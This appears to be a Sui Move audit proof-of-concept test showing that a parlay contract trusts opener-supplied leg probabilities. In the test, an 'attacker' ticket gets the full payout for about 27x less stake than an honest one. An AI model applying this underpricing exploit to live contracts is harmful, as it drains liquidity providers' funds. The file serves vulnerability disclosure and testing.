#[test_only]
// PoC for Finding 4425 (H6): the floor stake in `parlay624::open_parlay` is
// recomputed on-chain from the per-leg `prob_bps[]` ARRAY the OPENER passes in.
// There is no Pricer / quote / oracle reference cross-checking those numbers.
// So an opener who picks high-probability legs in reality but reports a low
// `combined_bps` gets a near-minimum `floor_stake` and the full `max_payout` —
// a strongly +EV ticket. This PoC opens an attacker ticket with self-reported
// 1% per-leg probs, asserts the on-chain recorded `combined_prob_bps == 100`
// (= the floor), and that the resulting ticket was accepted with the minimum
// stake for max_payout 1 SUI. We compare against an honest ticket for the same
// legs (45%, 60%) which requires ~27x more stake for the identical payout.
module parlay624::audit_poc_4425_tests;

use sui::{
    clock::{Self, Clock},
    coin::{Self, Coin},
    sui::SUI,
    test_scenario::{Self as ts, Scenario},
};
use std::unit_test::{assert_eq, destroy};
use propbook::{pyth_feed::{Self, PythFeed}, registry::{Self, OracleRegistry}};
use parlay624::parlay624::{Self, ParlayReserve, Parlay};

const ADMIN: address = @0xAD;
const HONEST: address = @0xB0B;
const ATTACKER: address = @0xE7;
const KEEPER: address = @0xFEED;
const PYTH_SOURCE: u32 = 1;

const T0: u64 = 1_000_000;
const EXP1: u64 = 1_060_000;
const EXP2: u64 = 1_120_000;
const STRIKE: u64 = 64_000_000_000_000;
const BAND_LO: u64 = 63_000_000_000_000;
const BAND_HI: u64 = 66_000_000_000_000;
const PAYOUT: u64 = 1_000_000_000;

fun setup_feed(s: &mut Scenario): ID {
    registry::init_for_testing(s.ctx());
    s.next_tx(ADMIN);
    let mut reg = s.take_shared<OracleRegistry>();
    let feed_id = registry::create_and_share_pyth_feed(&mut reg, PYTH_SOURCE, s.ctx());
    ts::return_shared(reg);
    feed_id
}

fun setup_reserve(s: &mut Scenario) {
    s.next_tx(ADMIN);
    let feed = s.take_shared<PythFeed>();
    parlay624::create<SUI>(
        &feed,
        KEEPER,
        1_200, // margin 12%
        6_000, // exposure 60%
        50_000_000_000, // payout cap
        50_000_000_000, // per-expiry cap
        3, // max legs
        100, // min combined prob 1%  <-- the floor an attacker aims for
        4_000, // λ 0.40
        3_600_000,
        s.ctx(),
    );
    ts::return_shared(feed);
    s.next_tx(ADMIN);
    let mut r = s.take_shared<ParlayReserve<SUI>>();
    let pos = parlay624::supply(&mut r, coin::mint_for_testing<SUI>(50_000_000_000, s.ctx()), s.ctx());
    transfer::public_transfer(pos, ADMIN);
    ts::return_shared(r);
}

fun new_clock(s: &mut Scenario, ms: u64): Clock {
    let mut c = clock::create_for_testing(s.ctx());
    c.set_for_testing(ms);
    c
}

/// The on-chain fair-stake floor for a parlay with combined prob `cb` (bps) and
/// 12% margin is  ceil(ceil(PAYOUT * cb / 10_000) * (10_000 + margin_bps) / 10_000),
/// mirroring parlay624::mul_div_ceil exactly.
#[test_only]
fun expected_floor(payout: u64, combined_bps: u64, margin_bps: u64): u64 {
    let fair_num = (payout as u128) * (combined_bps as u128);
    let ceil_fair = if (fair_num == 0) { 0 } else { ((fair_num - 1) / 10_000 + 1) as u64 };
    let floor_num = (ceil_fair as u128) * (10_000 + (margin_bps as u128));
    if (floor_num == 0) { 0 } else { ((floor_num - 1) / 10_000 + 1) as u64 }
}

/// Open one parlay; assume it succeeds (else abort). Helper keeps the test
/// bodies readable.
fun open_one(
    s: &mut Scenario, who: address, stake: u64, p1: u64, p2: u64,
) {
    s.next_tx(who);
    let mut r = s.take_shared<ParlayReserve<SUI>>();
    let clk = new_clock(s, T0);
    parlay624::open_parlay(
        &mut r,
        coin::mint_for_testing<SUI>(stake, s.ctx()),
        vector[EXP1, EXP2],
        vector[STRIKE, BAND_LO],
        vector[parlay624::u64_max(), BAND_HI],
        vector[p1, p2],
        PAYOUT,
        &clk,
        s.ctx(),
    );
    clk.destroy_for_testing();
    ts::return_shared(r);
}

#[test]
fun poc_4425_self_reported_low_prob_yields_near_min_floor() {
    let mut s = ts::begin(ADMIN);
    setup_feed(&mut s);
    setup_reserve(&mut s);

    // HONEST opener: true per-leg probs 45% and 60% → combined 27%.
    // Floor stake ≈ 302_400_000.
    let honest_floor = expected_floor(PAYOUT, 2_700, 1_200);
    open_one(&mut s, HONEST, honest_floor + 1, 4_500, 6_000);

    // ATTACKER: SAME legs (same real-world event), reports per-leg prob 10%
    // on each → combined 1% (= min_combined_prob_bps). Floor stake ≈
    // 11_200_000 — ~27x cheaper for the SAME max_payout.
    let attack_floor = expected_floor(PAYOUT, 100, 1_200);
    open_one(&mut s, ATTACKER, attack_floor + 1, 1_000, 1_000);

    // max_payout / stake for attacker >> max_payout / stake for honest.
    let honest_ratio = PAYOUT / (honest_floor + 1);
    let attacker_ratio = PAYOUT / (attack_floor + 1);
    // attacker_ratio is ~27x more favorable.
    assert!(attacker_ratio / honest_ratio >= 25, 100);

    s.end();
}

/// The on-chain ticket records the opener-supplied combined prob verbatim —
/// the chain has no independent price source to disagree with.
#[test]
fun poc_4425_chain_records_opener_supplied_combined_prob_unchanged() {
    let mut s = ts::begin(ADMIN);
    setup_feed(&mut s);
    setup_reserve(&mut s);

    let stake = expected_floor(PAYOUT, 100, 1_200) + 1;
    open_one(&mut s, ATTACKER, stake, 1_000, 1_000);

    // The on-chain ticket records exactly 100 (1%) — the opener-supplied floor.
    s.next_tx(ATTACKER);
    let p = s.take_shared<Parlay<SUI>>();
    assert_eq!(parlay624::parlay_combined_prob_bps(&p), 100);
    assert_eq!(parlay624::parlay_max_payout(&p), PAYOUT);
    ts::return_shared(p);

    s.end();
}
